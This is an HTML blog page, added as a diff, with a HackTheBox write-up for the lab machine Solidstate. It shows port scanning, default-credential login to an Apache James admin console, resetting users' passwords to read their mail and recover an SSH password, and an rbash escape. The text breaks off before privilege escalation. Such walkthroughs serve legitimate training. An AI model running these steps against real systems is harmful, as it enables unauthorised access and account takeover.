@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Solidstate | Initial nmap root@Kali:~# nmap -p- -sV 10.10.10.51 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-21 04:22 GMT Nmap scan report for...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Solidstate</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-01-21 04:33:00+00:00">Tue 21 January 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Solidstate.html">Solidstate</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Solidstate.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1>Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="mf">10.10.10.51</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">21</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">22</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.51</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.017</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65529</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
+<span class="n">PORT</span><span class="w">     </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">     </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">         </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mf">7.4</span><span class="n">p1</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="mi">10</span><span class="o">+</span><span class="n">deb9u1</span><span class="w"> </span><span class="p">(</span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span><span class="w"></span>
+<span class="mi">25</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">smtp</span><span class="w">        </span><span class="n">JAMES</span><span class="w"> </span><span class="n">smtpd</span><span class="w"> </span><span class="mf">2.3.2</span><span class="w"></span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">        </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">2.4.25</span><span class="w"> </span><span class="p">((</span><span class="n">Debian</span><span class="p">))</span><span class="w"></span>
+<span class="mi">110</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">pop3</span><span class="w">        </span><span class="n">JAMES</span><span class="w"> </span><span class="n">pop3d</span><span class="w"> </span><span class="mf">2.3.2</span><span class="w"></span>
+<span class="mi">119</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">nntp</span><span class="w">        </span><span class="n">JAMES</span><span class="w"> </span><span class="n">nntpd</span><span class="w"> </span><span class="p">(</span><span class="n">posting</span><span class="w"> </span><span class="n">ok</span><span class="p">)</span><span class="w"></span>
+<span class="mi">4555</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">james</span><span class="o">-</span><span class="k">admin</span><span class="w"> </span><span class="n">JAMES</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="k">Admin</span><span class="w"> </span><span class="mf">2.3.2</span><span class="w"></span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="err">:</span><span class="w"> </span><span class="n">solidstate</span><span class="p">;</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">28.37</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>I launch gobuster on the webserver and found the following directories:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# gobuster dir -u http://solidstate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5 </span>
+<span class="err">===============================================================</span>
+<span class="err">Gobuster v3.0.1</span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="err">===============================================================</span>
+<span class="err">[+] Url:            http://solidstate.htb</span>
+<span class="err">[+] Threads:        5</span>
+<span class="err">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="err">[+] User Agent:     gobuster/3.0.1</span>
+<span class="err">[+] Timeout:        10s</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/21 04:43:14 Starting gobuster</span>
+<span class="err">===============================================================</span>
+<span class="err">/images (Status: 301)</span>
+<span class="err">/assets (Status: 301)</span>
+<span class="err">/server-status (Status: 403)</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/21 04:53:37 Finished</span>
+<span class="err">===============================================================</span>
+</pre></div>
+
+
+<p>I had a look inside but found nothing useful. I then decided to look for exploits fot the James smpt server</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# searchsploit james</span>
+<span class="err">----------------------------------------------------- ----------------------------------------</span>
+<span class="err"> Exploit Title                                       |  Path</span>
+<span class="err">                                                     | (/usr/share/exploitdb/)</span>
+<span class="err">----------------------------------------------------- ----------------------------------------</span>
+<span class="err">Apache James Server 2.2 - SMTP Denial of Service     | exploits/multiple/dos/27915.pl</span>
+<span class="err">Apache James Server 2.3.2 - Remote Command Execution | exploits/linux/remote/35513.py</span>
+<span class="err">WheresJames Webcam Publisher Beta 2.0.0014 - Remote  | exploits/windows/remote/944.c</span>
+<span class="err">----------------------------------------------------- ----------------------------------------</span>
+<span class="c">Shellcodes: No Result</span>
+</pre></div>
+
+
+<p>Exploit 35513, which is also available here https://www.exploit-db.com/exploits/35513, is related to our version. The exploit would basically create a new user and enqueues a payload to be executed the next
+time a user logs in to the machine. In oder to do this the James server must have the default configuration which uses the default credentials root:root (username:password), unless of course you bruteforce it and get the non-default credentials. As I mentioned, the exploit requires someone to login in the box for the payload to be triggered. Since we don't have access to the box yet let's see if James uses the default credentials and if we can spot something useful. I see the exploit uses port 4555 to connect so I do the same:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# nc 10.10.10.51 4555</span>
+<span class="err">JAMES Remote Administration Tool 2.3.2</span>
+<span class="err">Please enter your login and password</span>
+<span class="err">Login id:</span>
+<span class="err">root</span>
+<span class="c">Password:</span>
+<span class="err">root</span>
+<span class="err">Welcome root. HELP for a list of commands</span>
+</pre></div>
+
+
+<p>Cool, the default credentials worked! The HELP command comes handy here as it shows me the commands I can run. </p>
+<div class="highlight"><pre><span></span><span class="err">listusers</span>
+<span class="err">Existing accounts 6</span>
+<span class="c">user: james</span>
+<span class="c">user: thomas</span>
+<span class="c">user: john</span>
+<span class="c">user: mindy</span>
+<span class="c">user: mailadmin</span>
+<span class="c">user: test</span>
+</pre></div>
+
+
+<p>Since we are root we can reset the password for all these users so that we can read the emails. Of course, I did it for all the users starting from the top but for the sake of brevity I will only report <strong>mindy</strong> here since it's the only user I found useful info for.</p>
+<div class="highlight"><pre><span></span><span class="err">setpassword mindy mindy      </span>
+<span class="err">Password for mindy reset</span>
+</pre></div>
+
+
+<p>Then I connect on the POP3 port 110 to read the emails</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">telnet</span> <span class="mf">10.10.10.51</span> <span class="mi">110</span>
+<span class="n">Trying</span> <span class="mf">10.10.10.51</span><span class="p">...</span>
+<span class="n">Connected</span> <span class="n">to</span> <span class="mf">10.10.10.51</span><span class="p">.</span>
+<span class="n">Escape</span> <span class="n">character</span> <span class="n">is</span> <span class="err">&#39;</span><span class="o">^</span><span class="p">]</span><span class="err">&#39;</span><span class="p">.</span>
+<span class="o">+</span><span class="n">OK</span> <span class="n">solidstate</span> <span class="n">POP3</span> <span class="n">server</span> <span class="p">(</span><span class="n">JAMES</span> <span class="n">POP3</span> <span class="n">Server</span> <span class="mf">2.3.2</span><span class="p">)</span> <span class="n">ready</span> 
+<span class="n">user</span> <span class="n">mindy</span>
+<span class="o">+</span><span class="n">OK</span>
+<span class="n">pass</span> <span class="n">mindy</span>
+<span class="o">+</span><span class="n">OK</span> <span class="n">Welcome</span> <span class="n">mindy</span>
+<span class="n">list</span>
+<span class="o">+</span><span class="n">OK</span> <span class="mi">2</span> <span class="mi">1945</span>
+<span class="mi">1</span> <span class="mi">1109</span>
+<span class="mi">2</span> <span class="mi">836</span>
+<span class="p">.</span>
+<span class="n">retr</span> <span class="mi">2</span>                                                                                                                                                                                        
+<span class="o">+</span><span class="n">OK</span> <span class="n">Message</span> <span class="n">follows</span>                                                                                                                                                                           
+<span class="n">Return</span><span class="o">-</span><span class="nl">Path</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">mailadmin</span><span class="p">@</span><span class="n">localhost</span><span class="o">&gt;</span>                                                                                                                                                            
+<span class="n">Message</span><span class="o">-</span><span class="nl">ID</span><span class="p">:</span> <span class="o">&lt;</span><span class="mf">16744123.2.1503422270399</span><span class="p">.</span><span class="n">JavaMail</span><span class="p">.</span><span class="n">root</span><span class="p">@</span><span class="n">solidstate</span><span class="o">&gt;</span>                                                                                                                               
+<span class="n">MIME</span><span class="o">-</span><span class="nl">Version</span><span class="p">:</span> <span class="mf">1.0</span>                                                                                                                                                                             
+<span class="n">Content</span><span class="o">-</span><span class="nl">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">us</span><span class="o">-</span><span class="n">ascii</span>                                                                                                                                                    
+<span class="n">Content</span><span class="o">-</span><span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span> <span class="mi">7</span><span class="n">bit</span>                                                                                                                                                               
+<span class="n">Delivered</span><span class="o">-</span><span class="nl">To</span><span class="p">:</span> <span class="n">mindy</span><span class="p">@</span><span class="n">localhost</span>                                                                                                                                                                 
+<span class="nl">Received</span><span class="p">:</span> <span class="n">from</span> <span class="mf">192.168.11.142</span> <span class="p">([</span><span class="mf">192.168.11.142</span><span class="p">])</span>                                                                                                                                              
+          <span class="n">by</span> <span class="n">solidstate</span> <span class="p">(</span><span class="n">JAMES</span> <span class="n">SMTP</span> <span class="n">Server</span> <span class="mf">2.3.2</span><span class="p">)</span> <span class="n">with</span> <span class="n">SMTP</span> <span class="n">ID</span> <span class="mi">581</span>                                                                                                                            
+          <span class="k">for</span> <span class="o">&lt;</span><span class="n">mindy</span><span class="p">@</span><span class="n">localhost</span><span class="o">&gt;</span><span class="p">;</span>                                                                                                                                                              
+          <span class="n">Tue</span><span class="p">,</span> <span class="mi">22</span> <span class="n">Aug</span> <span class="mi">2017</span> <span class="mi">13</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">28</span> <span class="o">-</span><span class="mo">0400</span> <span class="p">(</span><span class="n">EDT</span><span class="p">)</span>                                                                                                                                               
+<span class="nl">Date</span><span class="p">:</span> <span class="n">Tue</span><span class="p">,</span> <span class="mi">22</span> <span class="n">Aug</span> <span class="mi">2017</span> <span class="mi">13</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">28</span> <span class="o">-</span><span class="mo">0400</span> <span class="p">(</span><span class="n">EDT</span><span class="p">)</span>                                                                                                                                                   
+<span class="nl">From</span><span class="p">:</span> <span class="n">mailadmin</span><span class="p">@</span><span class="n">localhost</span>                                                                                                                                                                     
+<span class="nl">Subject</span><span class="p">:</span> <span class="n">Your</span> <span class="n">Access</span>                                                                                                                                                                          
+
+<span class="n">Dear</span> <span class="n">Mindy</span><span class="p">,</span>                                                                                                                                                                                   
+
+
+<span class="n">Here</span> <span class="n">are</span> <span class="n">your</span> <span class="n">ssh</span> <span class="n">credentials</span> <span class="n">to</span> <span class="n">access</span> <span class="n">the</span> <span class="n">system</span><span class="p">.</span> <span class="n">Remember</span> <span class="n">to</span> <span class="n">reset</span> <span class="n">your</span> <span class="n">password</span> <span class="n">after</span> <span class="n">your</span> <span class="n">first</span> <span class="n">login</span><span class="p">.</span>                                                                                   
+<span class="n">Your</span> <span class="n">access</span> <span class="n">is</span> <span class="k">restricted</span> <span class="n">at</span> <span class="n">the</span> <span class="n">moment</span><span class="p">,</span> <span class="n">feel</span> <span class="n">free</span> <span class="n">to</span> <span class="n">ask</span> <span class="n">your</span> <span class="n">supervisor</span> <span class="n">to</span> <span class="n">add</span> <span class="n">any</span> <span class="n">commands</span> <span class="n">you</span> <span class="n">need</span> <span class="n">to</span> <span class="n">your</span> <span class="n">path</span><span class="p">.</span>                                                                          
+
+<span class="nl">username</span><span class="p">:</span> <span class="n">mindy</span>                                                                                                                                                                               
+<span class="nl">pass</span><span class="p">:</span> <span class="n">P</span><span class="mi">@55</span><span class="n">W0rd1</span><span class="o">!</span><span class="mi">2</span><span class="p">@</span>                                                                                                                                                                            
+
+<span class="n">Respectfully</span><span class="p">,</span>                                                                                                                                                                                 
+<span class="n">James</span>                                                                                                                                                                                         
+
+<span class="p">.</span>         
+</pre></div>
+
+
+<p>We can see there are two messages. The second message contains SSH credentials we can potentially use to login to the box.</p>
+<div class="highlight"><pre><span></span><span class="err">mindy@solidstate:~$ ls -l</span>
+<span class="err">total 8</span>
+<span class="err">drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 bin</span>
+<span class="err">-rw------- 1 mindy mindy   33 Sep  8  2017 user.txt</span>
+</pre></div>
+
+
+<p>Indeed I was able to login and read the user.txt file. Now I wanted to look around but I get this message when I try to change directory:</p>
+<div class="highlight"><pre><span></span><span class="err">mindy@solidstate:~$ cd /</span>
+<span class="c">-rbash: cd: restricted</span>
+</pre></div>
+
+
+<p>We are logged in on a <a href="https://www.tecmint.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/">restricted shell</a> which does not allow us to do much.</p>
+<p>To bypass this, I logged off and logged back in again specifying the bash shell in the ssh command:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">ssh</span> <span class="n">mindy</span><span class="mf">@10.10.10.51</span> <span class="o">-</span><span class="n">t</span> <span class="n">bash</span>
+<span class="n">mindy</span><span class="mf">@10.10.10.51</span><span class="err">&#39;</span><span class="n">s</span> <span class="nl">password</span><span class="p">:</span> 
+<span class="err">$</span><span class="p">{</span><span class="nl">debian_chroot</span><span class="p">:</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="n">debian_chroot</span><span class="p">)}</span><span class="n">mindy</span><span class="p">@</span><span class="nl">solidstate</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span>
+<span class="err">$</span><span class="p">{</span><span class="nl">debian_chroot</span><span class="p">:</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="n">debian_chroot</span><span class="p">)}</span><span class="n">mindy</span><span class="p">@</span><span class="nl">solidstate</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">total</span> <span class="mi">80</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">22</span>  <span class="mi">2017</span> <span class="n">bin</span> 
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">22</span>  <span class="mi">2017</span> <span class="n">boot</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">17</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">3040</span> <span class="n">Jan</span> <span class="mi">20</span> <span class="mi">23</span><span class="o">:</span><span class="mi">11</span> <span class="n">dev</span> 
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">121</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">12288</span> <span class="n">Aug</span> <span class="mi">27</span>  <span class="mi">2017</span> <span class="n">etc</span> 
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">4</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">22</span>  <span class="mi">2017</span> <span class="n">home</span>
+<span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">31</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">initrd</span><span class="p">.</span><span class="n">images</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">initrd</span><span class="p">.</span><span class="n">images</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="mi">686</span><span class="o">-</span><span class="n">pae</span>
+<span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">31</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">initrd</span><span class="p">.</span><span class="n">images</span><span class="p">.</span><span class="n">old</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">initrd</span><span class="p">.</span><span class="n">images</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="mi">686</span><span class="o">-</span><span class="n">pae</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">16</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">22</span>  <span class="mi">2017</span> <span class="n">lib</span> 
+<span class="n">drwx</span><span class="o">------</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">16384</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">lost</span><span class="o">+</span><span class="n">found</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">media</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">mnt</span> 
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">22</span>  <span class="mi">2017</span> <span class="n">opt</span> 
+<span class="n">dr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">108</span> <span class="n">root</span> <span class="n">root</span>     <span class="mi">0</span> <span class="n">Jan</span> <span class="mi">20</span> <span class="mi">23</span><span class="o">:</span><span class="mi">11</span> <span class="n">proc</span>
+<span class="n">drwx</span><span class="o">------</span>   <span class="mi">8</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Sep</span>  <span class="mi">8</span>  <span class="mi">2017</span> <span class="n">root</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">21</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">640</span> <span class="n">Jan</span> <span class="mi">21</span> <span class="mo">01</span><span class="o">:</span><span class="mi">57</span> <span class="n">run</span> 
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">22</span>  <span class="mi">2017</span> <span class="n">sbin</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">srv</span> 
+<span class="n">dr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">13</span> <span class="n">root</span> <span class="n">root</span>     <span class="mi">0</span> <span class="n">Jan</span> <span class="mi">20</span> <span class="mi">23</span><span class="o">:</span><span class="mi">11</span> <span class="n">sys</span> 
+<span class="n">drwxrwxrwt</span>   <span class="mi">7</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">21</span> <span class="mo">01</span><span class="o">:</span><span class="mi">57</span> <span class="n">tmp</span> 
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">10</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">usr</span> 
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">12</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">22</span>  <span class="mi">2017</span> <span class="n">var</span> 
+<span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">28</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">vmlinuz</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">vmlinuz</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="mi">686</span><span class="o">-</span><span class="n">pae</span>
+<span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">28</span> <span class="n">Jun</span> <span class="mi">18</span>  <span class="mi">2017</span> <span class="n">vmlinuz</span><span class="p">.</span><span class="n">old</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">vmlinuz</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="mi">686</span><span class="o">-</span><span class="n">pae</span>
+</pre></div>
+
+
+<p>Now I am out of the restricted shell, as shown above I can change directories.</p>
+<p>At this stage I decided to download and run a linux enumeration script dubbed <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">LinuxSmartEnumeration</a> (sle) to see if it can give us some hints. </p>
+<p>After careful inspection I noticed this bit:</p>
